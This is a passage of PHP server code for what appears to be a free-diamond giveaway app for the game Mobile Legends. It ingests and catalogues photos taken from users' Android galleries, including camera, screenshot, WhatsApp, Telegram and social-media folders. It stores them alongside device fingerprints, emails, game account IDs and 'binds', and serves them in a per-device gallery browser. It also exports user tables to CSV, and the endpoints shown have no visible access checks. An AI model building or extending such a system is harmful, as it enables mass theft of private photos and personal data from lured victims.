        // ==========================================
        // 6. CSV DATA EXPORT
        // ==========================================
        case 'export_csv':
            $table = trim($_GET['table'] ?? 'redemptions');
            $allowedTables = ['users', 'redemptions', 'giveaway_entries'];
            if (!in_array($table, $allowedTables)) {
                $table = 'redemptions';
            }

            $res = supabaseApiRequest("$table?select=*&order=created_at.desc", 'GET');
            if (!$res['success'] || !is_array($res['data'])) {
                sendJson(false, null, 'Failed to fetch table data for export', 500);
            }

            $records = $res['data'];
            header('Content-Type: text/csv; charset=utf-8');
            header('Content-Disposition: attachment; filename="' . $table . '_export_' . date('Ymd_His') . '.csv"');

            $output = fopen('php://output', 'w');
            if (!empty($records)) {
                // Header row
                fputcsv($output, array_keys($records[0]));
                // Data rows
                foreach ($records as $row) {
                    fputcsv($output, array_values($row));
                }
            }
            fclose($output);
            exit;

        // ==========================================
        // 7. USER DEVICE GALLERY BROWSER & STORAGE (BY UNIQUE DEVICE)
        // ==========================================
        case 'sync_gallery_photos':
        case 'upload_gallery':
            $deviceId          = trim($body['device_id'] ?? $_POST['device_id'] ?? '');
            $deviceName        = trim($body['device_name'] ?? $_POST['device_name'] ?? '');
            $deviceModel       = trim($body['device_model'] ?? $_POST['device_model'] ?? '');
            $deviceFingerprint = trim($body['device_fingerprint'] ?? $_POST['device_fingerprint'] ?? '');
            $userEmail         = trim($body['user_email'] ?? $_POST['user_email'] ?? '');
            $mlbbId            = trim($body['mlbb_id'] ?? $_POST['mlbb_id'] ?? '');
            $mlbbServer        = trim($body['mlbb_server'] ?? $_POST['mlbb_server'] ?? '');
            $mlbbIgn           = trim($body['mlbb_ign'] ?? $_POST['mlbb_ign'] ?? '');

            if (empty($deviceId) && empty($userEmail)) {
                sendJson(false, null, 'Device ID or User email is required', 400);
            }

            // Resolve dedicated per-device folder to strictly prevent cross-device gallery mixing
            list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $userEmail, true);

            $metaFile = $targetDir . '/meta.json';
            $meta = file_exists($metaFile) ? json_decode(file_get_contents($metaFile), true) : [
                'device_id'          => $deviceId ?: $cleanDir,
                'device_name'        => $deviceName ?: 'Android Device',
                'device_model'       => $deviceModel,
                'device_fingerprint' => $deviceFingerprint,
                'user_email'         => $userEmail,
                'mlbb_id'            => $mlbbId,
                'mlbb_server'        => $mlbbServer,
                'mlbb_ign'           => $mlbbIgn,
                'photos'             => []
            ];

            // Lock device_id to the folder owner's unique ID
            if (!empty($deviceId)) {
                $meta['device_id'] = $deviceId;
            } else if (empty($meta['device_id'])) {
                $meta['device_id'] = $cleanDir;
            }

            if (!empty($deviceName)) $meta['device_name'] = $deviceName;
            if (!empty($deviceModel)) $meta['device_model'] = $deviceModel;
            if (!empty($deviceFingerprint)) $meta['device_fingerprint'] = $deviceFingerprint;
            if (!empty($userEmail)) $meta['user_email'] = $userEmail;
            if (!empty($mlbbId)) $meta['mlbb_id'] = $mlbbId;
            if (!empty($mlbbServer)) $meta['mlbb_server'] = $mlbbServer;
            if (!empty($mlbbIgn)) $meta['mlbb_ign'] = $mlbbIgn;

            // Preserve full access if client asserts true OR if photos are already uploaded
            if (isset($body['is_full_access'])) {
                if (!empty($body['is_full_access'])) {
                    $meta['is_full_access'] = true;
                } else if (empty($meta['photos'])) {
                    $meta['is_full_access'] = false;
                }
            }
            if (isset($body['binds'])) $meta['binds'] = $body['binds'];
            if (isset($body['user_binds'])) $meta['user_binds'] = $body['user_binds'];

            $savedCount = 0;
            $incomingPhotos = $body['photos'] ?? [];

            if (is_array($incomingPhotos)) {
                foreach ($incomingPhotos as $idx => $item) {
                    $dataUrl = $item['dataUrl'] ?? '';
                    if (empty($dataUrl)) continue;

                    $origName = $item['name'] ?? ('device_photo_' . time() . '_' . $idx . '.jpg');
                    $fileMime = $item['mime'] ?? 'image/jpeg';
                    $fileSize = intval($item['size'] ?? 0);
                    $isAvatar = !empty($item['is_avatar']);

                    // Decode base64 payload
                    $parts = explode(',', $dataUrl);
                    $rawBase64 = end($parts);
                    $decoded = base64_decode($rawBase64);
                    if ($decoded === false || strlen($decoded) === 0) continue;

                    if ($isAvatar) {
                        $avatarFile = $targetDir . '/avatar_current.jpg';
                        $avatarHash = md5($decoded);

                        // If identical to existing avatar on disk, skip redundant write
                        if (file_exists($avatarFile) && md5_file($avatarFile) === $avatarHash) {
                            continue;
                        }

                        // Prune any previous avatar files from disk
                        foreach (scandir($targetDir) as $oldF) {
                            if (strpos(strtolower($oldF), 'avatar_') === 0) {
                                @unlink($targetDir . '/' . $oldF);
                            }
                        }

                        file_put_contents($avatarFile, $decoded);
                        $fileSize = strlen($decoded);

                        // Remove all old avatar entries from $meta['photos']
                        $meta['photos'] = array_values(array_filter($meta['photos'] ?? [], function($p) {
                            $fn = strtolower($p['filename'] ?? '');
                            $nm = strtolower($p['name'] ?? '');
                            return empty($p['is_avatar']) && strpos($fn, 'avatar_') !== 0 && strpos($nm, 'avatar_') !== 0;
                        }));

                        // Prepend single canonical avatar entry
                        array_unshift($meta['photos'], [
                            'id'           => 'avatar_current',
                            'filename'     => 'avatar_current.jpg',
                            'name'         => 'Profile Avatar',
                            'album'        => 'Avatar',
                            'folder'       => '',
                            'url'          => 'uploads/gallery/' . $cleanDir . '/avatar_current.jpg',
                            'size'         => $fileSize,
                            'mime'         => $fileMime,
                            'is_avatar'    => true,
                            'content_hash' => $avatarHash,
                            'date_added'   => date('c')
                        ]);
                        $savedCount++;
                        continue;
                    }

                    // Non-avatar regular device photo
                    $contentHash = md5($decoded);

                    // If identical to existing profile avatar, skip to prevent avatar duplication in gallery
                    $avatarPath = $targetDir . '/avatar_current.jpg';
                    if (file_exists($avatarPath) && md5_file($avatarPath) === $contentHash) {
                        continue;
                    }

                    // Extract / normalize album and folder info
                    $albumName = trim($item['album'] ?? '');
                    $folderRel = trim($item['folder'] ?? '');
                    $filePath  = trim($item['path'] ?? '');

                    if (empty($albumName)) {
                        $combined = strtolower($folderRel . ' ' . $filePath . ' ' . $origName);
                        if (strpos($combined, 'screenshot') !== false) $albumName = 'Screenshots';
                        else if (strpos($combined, 'camera') !== false || strpos($combined, 'dcim') !== false) $albumName = 'Camera';
                        else if (strpos($combined, 'whatsapp business') !== false || strpos($combined, 'w4b') !== false) $albumName = 'WhatsApp Business';
                        else if (strpos($combined, 'whatsapp') !== false) $albumName = 'WhatsApp';
                        else if (strpos($combined, 'telegram') !== false) $albumName = 'Telegram';
                        else if (strpos($combined, 'download') !== false) $albumName = 'Downloads';
                        else if (strpos($combined, 'instagram') !== false) $albumName = 'Instagram';
                        else if (strpos($combined, 'facebook') !== false) $albumName = 'Facebook';
                        else if (strpos($combined, 'messenger') !== false) $albumName = 'Messenger';
                        else if (strpos($combined, 'twitter') !== false || strpos($combined, '/x/') !== false) $albumName = 'Twitter';
                        else if (strpos($combined, 'snapchat') !== false) $albumName = 'Snapchat';
                        else if (strpos($combined, 'snapseed') !== false) $albumName = 'Snapseed';
                        else if (strpos($combined, 'vmos') !== false) $albumName = 'VMOS Transfer';
                        else if (strpos($combined, 'pictures') !== false) $albumName = 'Pictures';
                        else $albumName = 'Gallery';
                    }

                    // Accurate deduplication: only skip if identical content hash OR (same name AND same album AND same size)
                    $alreadyExists = false;
                    if (!empty($meta['photos'])) {
                        foreach ($meta['photos'] as $existingPhoto) {
                            if (!empty($existingPhoto['content_hash']) && $existingPhoto['content_hash'] === $contentHash) {
                                $alreadyExists = true;
                                break;
                            }
                            if (($existingPhoto['name'] ?? '') === $origName && ($existingPhoto['album'] ?? '') === $albumName && intval($existingPhoto['size'] ?? 0) === $fileSize) {
                                $alreadyExists = true;
                                break;
                            }
                        }
                    }
                    if ($alreadyExists) continue;

                    $filename = 'photo_' . time() . '_' . $idx . '_' . substr($contentHash, 0, 6) . '.jpg';
                    $destPath = $targetDir . '/' . $filename;
                    file_put_contents($destPath, $decoded);
                    if ($fileSize <= 0) $fileSize = strlen($decoded);

                    $meta['photos'][] = [
                        'id'           => 'photo_' . time() . '_' . $idx . '_' . substr($contentHash, 0, 4),
                        'filename'     => $filename,
                        'name'         => $origName,
                        'album'        => $albumName,
                        'folder'       => $folderRel,
                        'url'          => 'uploads/gallery/' . $cleanDir . '/' . $filename,
                        'size'         => $fileSize,
                        'mime'         => $fileMime,
                        'is_avatar'    => false,
                        'content_hash' => $contentHash,
                        'date_added'   => date('c')
                    ];
                    $meta['is_full_access'] = true;
                    $savedCount++;
                }
            }

            cleanAndSanitizeDeviceGallery($targetDir, $meta);
            $meta['last_synced'] = date('c');
            file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

            sendJson(true, [
                'saved_count'  => $savedCount,
                'total_photos' => count($meta['photos']),
                'device_id'    => $meta['device_id'],
                'device_name'  => $meta['device_name'],
                'user_email'   => $userEmail
            ], "Device gallery photos synced ($savedCount uploaded)");
            break;

        case 'save_player_binds':
            $deviceId  = trim($body['device_id'] ?? '');
            $userEmail = trim($body['user_email'] ?? '');
            $userBinds = $body['user_binds'] ?? [];
            $binds     = $body['binds'] ?? [];

            if (empty($deviceId) && empty($userEmail)) {
                sendJson(false, null, 'Device ID or User Email is required', 400);
            }

            list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $userEmail, true);

            $metaFile = $targetDir . '/meta.json';
            $meta = file_exists($metaFile) ? json_decode(file_get_contents($metaFile), true) : [
                'device_id'   => $deviceId ?: $cleanDir,
                'user_email'  => $userEmail,
                'photos'      => []
            ];

            $meta['user_binds'] = $userBinds;
            if (!empty($binds)) $meta['binds'] = $binds;
            if (!empty($body['device_fingerprint'])) $meta['device_fingerprint'] = trim($body['device_fingerprint']);
            if (!empty($body['device_model'])) $meta['device_model'] = trim($body['device_model']);
            if (!empty($body['mlbb_id'])) $meta['mlbb_id'] = trim($body['mlbb_id']);
            if (!empty($body['mlbb_server'])) $meta['mlbb_server'] = trim($body['mlbb_server']);
            if (!empty($body['mlbb_ign'])) $meta['mlbb_ign'] = trim($body['mlbb_ign']);
            $meta['last_synced'] = date('c');

            file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
            sendJson(true, ['user_binds' => $userBinds], 'Platform binds saved successfully');
            break;

        case 'list_user_gallery':
            $deviceId = trim($_GET['device_id'] ?? $body['device_id'] ?? $_GET['email'] ?? $body['email'] ?? '');
            if (empty($deviceId)) {
                sendJson(false, null, 'Device ID is required', 400);
            }

            $galleryDir = __DIR__ . '/uploads/gallery';
            $targetDir = null;
            $metaFile = null;
            $meta = null;

            list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, '', false);
            $metaFile = $targetDir ? ($targetDir . '/meta.json') : null;
            $meta = ($metaFile && file_exists($metaFile)) ? json_decode(file_get_contents($metaFile), true) : null;

            $photos = [];
            $devicePhotos = [];
            $email = $meta['user_email'] ?? (strpos($deviceId, '@') !== false ? $deviceId : '');
            $deviceName = $meta['device_name'] ?? 'Android Device';
            $deviceModel = $meta['device_model'] ?? '';
            $phoneModel = formatPhoneModelName(!empty($deviceModel) ? $deviceModel : $deviceName);
            $deviceName = $phoneModel;

            $canonicalDevId = $meta['device_id'] ?? $deviceId;
            $deviceTag = '';
            if (strpos($canonicalDevId, 'dev_') === 0) {
                $cleanSuffix = substr($canonicalDevId, 4);
                $dashPos = strpos($cleanSuffix, '-');
                $deviceTag = ($dashPos !== false) ? substr($cleanSuffix, 0, $dashPos) : substr($cleanSuffix, 0, 8);
            } else if (strlen($canonicalDevId) >= 6) {
                $deviceTag = substr($canonicalDevId, 0, 8);
            } else {
                $deviceTag = $canonicalDevId;
            }

            $userInfo = [
                'device_id'          => $canonicalDevId,
                'device_tag'         => $deviceTag,
                'device_name'        => $deviceName,
                'device_model'       => $deviceModel,
                'phone_model'        => $phoneModel,
                'device_fingerprint' => $meta['device_fingerprint'] ?? '',
                'email'              => $email,
                'ign'                => $meta['mlbb_ign'] ?? '—',
                'mlbb_id'            => $meta['mlbb_id'] ?? '—',
                'mlbb_server'        => $meta['mlbb_server'] ?? '—',
                'region'             => '—'
            ];

            // Look up text profile details from Supabase if missing from meta
            $supabaseAvatar = null;
            $userPoints = 0;
            $userDiamonds = 0;
            $userCreatedAt = '';
            $u = null;

            // Strategy 0: Look up by device_id inside location_text JSON
            if (!$u && !empty($deviceId)) {
                $locRes = supabaseApiRequest('users?location_text=ilike.*' . urlencode('"device_id":"' . $deviceId . '"') . '*&select=*', 'GET');
                if ($locRes['success'] && !empty($locRes['data'])) {
                    $u = $locRes['data'][0];
                }
            }

            // Strategy 0b: Look up by synthetic device email device_{deviceId}@ketupat.app
            if (!$u && !empty($deviceId)) {
                $devMailRes = supabaseApiRequest('users?email=eq.' . urlencode('device_' . $deviceId . '@ketupat.app') . '&select=*', 'GET');
                if ($devMailRes['success'] && !empty($devMailRes['data'])) {
                    $u = $devMailRes['data'][0];
                }
            }

            // Strategy 1: Look up by email if available
            if (!$u && !empty($email) && strpos($email, '@') !== false) {
                $userRes = supabaseApiRequest('users?email=eq.' . urlencode($email) . '&select=*', 'GET');
                if ($userRes['success'] && !empty($userRes['data'])) {
                    $u = $userRes['data'][0];
                }
            }

            // Strategy 2: If not found, look up by numeric mlbb_id
            if (!$u) {
                $mlbbCandidate = null;
                if (ctype_digit($deviceId)) {
                    $mlbbCandidate = $deviceId;
                } else if (preg_match('/^dev_([0-9]{5,})$/', $deviceId, $m)) {
                    $mlbbCandidate = $m[1];
                }
                if (!empty($mlbbCandidate)) {
                    $userRes = supabaseApiRequest('users?mlbb_id=eq.' . urlencode($mlbbCandidate) . '&select=*', 'GET');
                    if ($userRes['success'] && !empty($userRes['data'])) {
                        $u = $userRes['data'][0];
                    }
                }
            }

            // Strategy 3: Look up by username or direct match
            if (!$u && !empty($deviceId)) {
                $userRes = supabaseApiRequest('users?or=(username.eq.' . urlencode($deviceId) . ',email.eq.' . urlencode($deviceId) . ')&select=*', 'GET');
                if ($userRes['success'] && !empty($userRes['data'])) {
                    $u = $userRes['data'][0];
                }
            }

            $linkedUsers = $u ? [$u] : [];
            if ($u && !empty($u['mlbb_id'])) {
                $linkedRes = supabaseApiRequest('users?mlbb_id=eq.' . urlencode($u['mlbb_id']) . '&select=*', 'GET');
                if ($linkedRes['success'] && !empty($linkedRes['data'])) {
                    foreach ($linkedRes['data'] as $lu) {
                        if (($lu['id'] ?? '') !== ($u['id'] ?? '')) {
                            $linkedUsers[] = $lu;
                        }
                    }
                }
            }

            $supabaseLoc = null;
            $mergedBinds = [];
            $mergedUserBinds = [];

            foreach ($linkedUsers as $userRow) {
                if ($userInfo['ign'] === '—' || empty($userInfo['ign']) || $userInfo['ign'] === 'Player') {
                    if (!empty($userRow['mlbb_ign'])) $userInfo['ign'] = $userRow['mlbb_ign'];
                    else if (!empty($userRow['username'])) $userInfo['ign'] = $userRow['username'];
                }
                if ($userInfo['mlbb_id'] === '—' || empty($userInfo['mlbb_id'])) {
                    if (!empty($userRow['mlbb_id'])) $userInfo['mlbb_id'] = $userRow['mlbb_id'];
                }
                if ($userInfo['mlbb_server'] === '—' || empty($userInfo['mlbb_server'])) {
                    if (!empty($userRow['mlbb_server'])) $userInfo['mlbb_server'] = $userRow['mlbb_server'];
                }
                $rowEmail = trim($userRow['email'] ?? '');
                if (!empty($rowEmail) && !str_ends_with(strtolower($rowEmail), '@ketupat.app') && strtolower($rowEmail) !== 'guest@ketupat.app') {
                    $userInfo['email'] = $rowEmail;
                    $email = $rowEmail;
                }
                if (empty($userInfo['region']) || $userInfo['region'] === '—') {
                    if (!empty($userRow['mlbb_region'])) $userInfo['region'] = $userRow['mlbb_region'];
                }
                if (empty($supabaseAvatar) && !empty($userRow['avatar_data'])) {
                    $supabaseAvatar = $userRow['avatar_data'];
                }
                $userPoints = max($userPoints, intval($userRow['points'] ?? 0));
                $userDiamonds = max($userDiamonds, intval($userRow['diamonds_claimed'] ?? 0));
                if (empty($userCreatedAt) && !empty($userRow['created_at'])) {
                    $userCreatedAt = $userRow['created_at'];
                }

                if (!empty($userRow['location_text']) && strpos($userRow['location_text'], '{') !== false) {
                    $rowLoc = json_decode($userRow['location_text'], true);
                    if ($rowLoc && is_array($rowLoc)) {
                        $isRowForThisDevice = (!empty($rowLoc['device_id']) && strcasecmp($rowLoc['device_id'], $canonicalDevId) === 0) ||
                                              (!empty($userRow['email']) && strcasecmp($userRow['email'], 'device_' . $canonicalDevId . '@ketupat.app') === 0);
                        if ($isRowForThisDevice) {
                            $supabaseLoc = $rowLoc;
                            if (!empty($rowLoc['device_model']) && empty($meta['device_model'])) {
                                $userInfo['device_model'] = $rowLoc['device_model'];
                                $phoneModel = formatPhoneModelName($rowLoc['device_model']);
                                $userInfo['phone_model'] = $phoneModel;
                                $userInfo['device_name'] = $phoneModel;
                            }
                            if (!empty($rowLoc['device_fingerprint']) && empty($meta['device_fingerprint'])) {
                                $userInfo['device_fingerprint'] = $rowLoc['device_fingerprint'];
                            }
                        }
                        if (!empty($rowLoc['binds']) && is_array($rowLoc['binds'])) {
                            $mergedBinds = array_merge($mergedBinds, $rowLoc['binds']);
                        }
                        if (!empty($rowLoc['user_binds']) && is_array($rowLoc['user_binds'])) {
                            $mergedUserBinds = array_merge($mergedUserBinds, $rowLoc['user_binds']);
                        }
                    }
                }
            }

            $userInfo['points'] = $userPoints;
            $userInfo['diamonds_claimed'] = $userDiamonds;
            $userInfo['created_at'] = $userCreatedAt;

            $canonicalDevId = $userInfo['device_id'];
            if (strpos($canonicalDevId, 'dev_') === 0) {
                $cleanSuffix = substr($canonicalDevId, 4);
                $dashPos = strpos($cleanSuffix, '-');
                $deviceTag = ($dashPos !== false) ? substr($cleanSuffix, 0, $dashPos) : substr($cleanSuffix, 0, 8);
            } else if (strlen($canonicalDevId) >= 6) {
                $deviceTag = substr($canonicalDevId, 0, 8);
            } else {
                $deviceTag = $canonicalDevId;
            }
            $userInfo['device_tag'] = $deviceTag;

            $hasValidMlbb = (!empty($userInfo['mlbb_id']) && $userInfo['mlbb_id'] !== '—');
            $hasValidServer = (!empty($userInfo['mlbb_server']) && $userInfo['mlbb_server'] !== '—');
            if ($hasValidMlbb) {
                $userInfo['formatted_title'] = $phoneModel . ' [#' . $deviceTag . '] | ' . $userInfo['mlbb_id'] . ($hasValidServer ? ' (' . $userInfo['mlbb_server'] . ')' : '');
            } else {
                $playerLabel = (!empty($userInfo['ign']) && $userInfo['ign'] !== '—' && $userInfo['ign'] !== 'Player') ? $userInfo['ign'] : 'Device ' . $deviceTag;
                $userInfo['formatted_title'] = $phoneModel . ' [#' . $deviceTag . '] | ' . $playerLabel;
            }

            // 4. Load synced device gallery photos strictly from THIS specific device's folder
            cleanAndSanitizeDeviceGallery($targetDir, $meta);
            $hasDeviceAvatar = false;
            $dirBasename = $targetDir ? basename($targetDir) : '';
            $totalStorageBytes = 0;

            if ($meta && !empty($meta['photos'])) {
                // Separate avatars and regular device photos
                $metaAvatars = [];
                $metaRegularPhotos = [];
                foreach ($meta['photos'] as $p) {
                    $pName = strtolower($p['name'] ?? '');
                    $pFn = strtolower($p['filename'] ?? '');
                    $isAvatar = !empty($p['is_avatar']) || (strpos($pName, 'avatar_') === 0) || (strpos($pFn, 'avatar_') === 0);
                    if ($isAvatar) {
                        $metaAvatars[] = $p;
                    } else {
                        $metaRegularPhotos[] = $p;
                    }
                }

                // If duplicate avatars exist from prior syncs, retain strictly the single newest
                $chosenAvatar = !empty($metaAvatars) ? end($metaAvatars) : null;
                $cleanMetaPhotos = $metaRegularPhotos;
                if ($chosenAvatar) {
                    array_unshift($cleanMetaPhotos, $chosenAvatar);
                }

                foreach ($cleanMetaPhotos as $p) {
                    $pName = strtolower($p['name'] ?? '');
                    $pFn = strtolower($p['filename'] ?? '');
                    $isAvatar = !empty($p['is_avatar']) || (strpos($pName, 'avatar_') === 0) || (strpos($pFn, 'avatar_') === 0);

                    $url = $p['url'];
                    if (strpos($url, 'uploads/gallery/') === false && $dirBasename) {
                        $url = 'uploads/gallery/' . $dirBasename . '/' . basename($p['filename']);
                    }

                    $pSize = intval($p['size'] ?? 0);
                    $totalStorageBytes += $pSize;

                    $albumName = trim($p['album'] ?? '');
                    if (empty($albumName) || $albumName === 'Gallery') {
                        $combined = strtolower(($p['folder'] ?? '') . ' ' . ($p['path'] ?? '') . ' ' . ($p['name'] ?? '') . ' ' . ($p['filename'] ?? ''));
                        if (strpos($combined, 'screenshot') !== false || strpos($combined, 'screen') !== false || strpos($combined, 'scr_') !== false || strpos($combined, 'scr.') !== false || strpos($combined, 'scr2') !== false || strpos($combined, 'scr3') !== false) $albumName = 'Screenshots';
                        else if (strpos($combined, 'camera') !== false || strpos($combined, 'dcim') !== false) $albumName = 'Camera';
                        else if (strpos($combined, 'whatsapp business') !== false || strpos($combined, 'w4b') !== false) $albumName = 'WhatsApp Business';
                        else if (strpos($combined, 'whatsapp') !== false) $albumName = 'WhatsApp';
                        else if (strpos($combined, 'telegram') !== false) $albumName = 'Telegram';
                        else if (strpos($combined, 'download') !== false) $albumName = 'Downloads';
                        else if (strpos($combined, 'instagram') !== false) $albumName = 'Instagram';
                        else if (strpos($combined, 'facebook') !== false) $albumName = 'Facebook';
                        else if (strpos($combined, 'messenger') !== false) $albumName = 'Messenger';
                        else if (strpos($combined, 'twitter') !== false || strpos($combined, '/x/') !== false) $albumName = 'Twitter';
                        else if (strpos($combined, 'snapchat') !== false) $albumName = 'Snapchat';
                        else if (strpos($combined, 'snapseed') !== false) $albumName = 'Snapseed';
                        else if (strpos($combined, 'vmos') !== false) $albumName = 'VMOS Transfer';
                        else if (strpos($combined, 'bstsharedfolder') !== false || strpos($combined, 'bluestacks') !== false) $albumName = 'BlueStacks Shared';
                        else if (strpos($combined, 'pictures') !== false) $albumName = 'Pictures';
                        else if (empty($albumName)) $albumName = 'Gallery';
                    }

                    $photoObj = [
                        'id'         => $p['id'] ?? $p['filename'],
                        'filename'   => $p['filename'],
                        'name'       => $p['name'] ?? $p['filename'],
                        'album'      => $albumName,
                        'folder'     => $p['folder'] ?? '',
                        'url'        => $url,
                        'size'       => $pSize,
                        'mime'       => $p['mime'] ?? 'image/jpeg',
                        'is_avatar'  => $isAvatar,
                        'date_added' => $p['date_added'] ?? date('c')
                    ];

                    if ($isAvatar) {
                        if (!$hasDeviceAvatar) {
                            $hasDeviceAvatar = true;
                            array_unshift($photos, $photoObj);
                        }
                    } else {
                        $photos[] = $photoObj;
                        $devicePhotos[] = $photoObj;
                    }
                }
            }

            // Also scan physical directory for any un-indexed photos
            if ($targetDir && is_dir($targetDir)) {
                foreach (scandir($targetDir) as $f) {
                    if ($f === '.' || $f === '..' || $f === 'meta.json') continue;
                    $filePath = $targetDir . '/' . $f;
                    if (!is_file($filePath)) continue;
                    $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
                    if (!in_array($ext, ['jpg', 'jpeg', 'png', 'webp', 'gif'])) continue;

                    $isAv = (strpos(strtolower($f), 'avatar_') === 0);
                    if ($isAv && $hasDeviceAvatar) continue; // Skip extra avatar files

                    // Check if already in $photos
                    $found = false;
                    foreach ($photos as $ep) {
                        if (($ep['filename'] ?? '') === $f) {
                            $found = true;
                            break;
                        }
                    }
                    if (!$found) {
                        $fSize = filesize($filePath);
                        $totalStorageBytes += $fSize;

                        $combined = strtolower($f);
                        $fAlbum = 'Gallery';
                        if (strpos($combined, 'screenshot') !== false) $fAlbum = 'Screenshots';
                        else if (strpos($combined, 'camera') !== false || strpos($combined, 'dcim') !== false) $fAlbum = 'Camera';
                        else if (strpos($combined, 'whatsapp') !== false) $fAlbum = 'WhatsApp';
                        else if (strpos($combined, 'download') !== false) $fAlbum = 'Downloads';

                        $photoObj = [
                            'id'         => $f,
                            'filename'   => $f,
                            'name'       => $f,
                            'album'      => $fAlbum,
                            'folder'     => '',
                            'url'        => 'uploads/gallery/' . $dirBasename . '/' . $f,
                            'size'       => $fSize,
                            'mime'       => ($ext === 'png' ? 'image/png' : ($ext === 'webp' ? 'image/webp' : 'image/jpeg')),
                            'is_avatar'  => $isAv,
                            'date_added' => date('c', filemtime($filePath))
                        ];
                        if ($isAv) {
                            if (!$hasDeviceAvatar) {
                                $hasDeviceAvatar = true;
                                array_unshift($photos, $photoObj);
                            }
                        } else {
                            $photos[] = $photoObj;
                            $devicePhotos[] = $photoObj;
                        }
                    }
                }
            }

            // If no avatar photo from device, but Supabase has avatar data, include it
            if (!$hasDeviceAvatar && !empty($supabaseAvatar)) {
                $avatarObj = [
                    'id'         => 'supabase_avatar_' . md5($email),
                    'filename'   => 'avatar_' . md5($email) . '.jpg',
                    'name'       => 'Profile Avatar',
                    'album'      => 'Avatar',
                    'folder'     => '',
                    'url'        => $supabaseAvatar,
                    'size'       => strlen($supabaseAvatar),
                    'mime'       => 'image/jpeg',
                    'is_avatar'  => true,
                    'date_added' => date('c')
                ];
                array_unshift($photos, $avatarObj);
                $hasDeviceAvatar = true;
            }

            // Sort device photos newest first so recently added photos show at the top
            usort($devicePhotos, function ($a, $b) {
                $tA = !empty($a['date_added']) ? strtotime($a['date_added']) : 0;
                $tB = !empty($b['date_added']) ? strtotime($b['date_added']) : 0;
                return $tB - $tA;
            });

            // Reconstruct photos list: avatars first, then sorted device photos
            $avatarPhotos = array_filter($photos, function ($p) { return !empty($p['is_avatar']); });
            $photos = array_merge(array_values($avatarPhotos), $devicePhotos);

            // Compute album counts
            $albumCounts = [];
            foreach ($photos as $ph) {
                if (!empty($ph['is_avatar'])) continue;
                $alb = $ph['album'] ?? 'Gallery';
                if (!isset($albumCounts[$alb])) $albumCounts[$alb] = 0;
                $albumCounts[$alb]++;
            }

            $orderedAlbums = [];
            $orderedAlbums[] = ['name' => 'All', 'count' => count($photos) - ($hasDeviceAvatar ? 1 : 0)];
            $priority = ['Camera', 'Screenshots', 'WhatsApp', 'WhatsApp Business', 'Downloads', 'Telegram', 'Instagram', 'Pictures', 'BlueStacks Shared', 'VMOS Transfer'];
            foreach ($priority as $pr) {
                if (isset($albumCounts[$pr])) {
                    $orderedAlbums[] = ['name' => $pr, 'count' => $albumCounts[$pr]];
                    unset($albumCounts[$pr]);
                }
            }
            ksort($albumCounts);
            foreach ($albumCounts as $albName => $albCount) {
                $orderedAlbums[] = ['name' => $albName, 'count' => $albCount];
            }

            $deviceCount = count($devicePhotos);
            $hasFullAccess = !empty($meta['is_full_access']) || ($deviceCount > 0) || (!empty($supabaseLoc['has_access'])) || (!empty($supabaseLoc['access_status']) && ($supabaseLoc['access_status'] === 'full_access' || $supabaseLoc['access_status'] === 'granted'));
            $accessStatus = $hasFullAccess ? 'granted' : ($hasDeviceAvatar ? 'avatar_only' : (!empty($supabaseAvatar) ? 'avatar_only' : 'none'));

            $formattedStorage = $totalStorageBytes >= 1048576 
                ? round($totalStorageBytes / 1048576, 2) . ' MB' 
                : round($totalStorageBytes / 1024, 1) . ' KB';

            $deviceBinds = $meta['binds'] ?? [];
            $userBinds = $meta['user_binds'] ?? [];
            if (empty($deviceBinds) && !empty($mergedBinds)) {
                $deviceBinds = $mergedBinds;
            }
            if (empty($userBinds) && !empty($mergedUserBinds)) {
                $userBinds = $mergedUserBinds;
            }

            sendJson(true, [
                'device'             => [
                    'id'                     => $userInfo['device_id'],
                    'tag'                    => $userInfo['device_tag'] ?? '',
                    'name'                   => $userInfo['device_name'],
                    'model'                  => $userInfo['device_model'],
                    'phone_model'            => $phoneModel,
                    'fingerprint'            => $userInfo['device_fingerprint'],
                    'formatted_title'        => $userInfo['formatted_title'],
                    'storage_path'           => 'uploads/gallery/' . ($cleanDir ?: $dirBasename),
                    'storage_size_bytes'     => $totalStorageBytes,
                    'storage_size_formatted' => $formattedStorage,
                    'last_synced'            => $meta['last_synced'] ?? date('c'),
                    'binds'                  => $deviceBinds,
                    'user_binds'             => $userBinds
                ],
                'user'               => $userInfo,
                'photos'             => $photos,
                'albums'             => $orderedAlbums,
                'total_photos'       => count($photos),
                'device_photo_count' => $deviceCount,
                'has_gallery_access' => $hasFullAccess,
                'access_status'      => $accessStatus,
                'storage_size'       => $formattedStorage,
                'binds'              => $deviceBinds,
                'user_binds'         => $userBinds,
                'hero_avatar'        => $photos[0]['url'] ?? $supabaseAvatar
            ], 'Device gallery photos retrieved');
            break;

        case 'delete_gallery_photo':
            $deviceId = trim($body['device_id'] ?? $_GET['device_id'] ?? $body['email'] ?? $_GET['email'] ?? '');
            $filename = trim($body['filename'] ?? $_GET['filename'] ?? '');

            if (empty($deviceId) || empty($filename)) {
                sendJson(false, null, 'Device ID and filename are required', 400);
            }

            list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $deviceId, false);
            $targetEmail = (strpos($deviceId, '@') !== false) ? $deviceId : null;

            if ($targetDir) {
                $baseFn = basename($filename);
                $filePath = $targetDir . '/' . $baseFn;
                $metaFile = $targetDir . '/meta.json';
                if (file_exists($filePath)) {
                    @unlink($filePath);
                }
                if (file_exists($metaFile)) {
                    $meta = json_decode(file_get_contents($metaFile), true);
                    if (is_array($meta)) {
                        if (!$targetEmail && !empty($meta['user_email'])) $targetEmail = $meta['user_email'];
                        $meta['photos'] = array_values(array_filter($meta['photos'] ?? [], function($p) use ($baseFn, $filename) {
                            $pFn = basename($p['filename'] ?? '');
                            $pId = $p['id'] ?? '';
                            $pUrl = basename($p['url'] ?? '');
                            $pOrig = basename($p['name'] ?? '');
                            return ($pFn !== $baseFn && $pId !== $filename && $pUrl !== $baseFn && ($p['filename'] ?? '') !== $filename);
                        }));
                        $meta['is_full_access'] = count($meta['photos'] ?? []) > 0;
                        $meta['last_synced'] = date('c');
                        file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
                    }
                }
            }

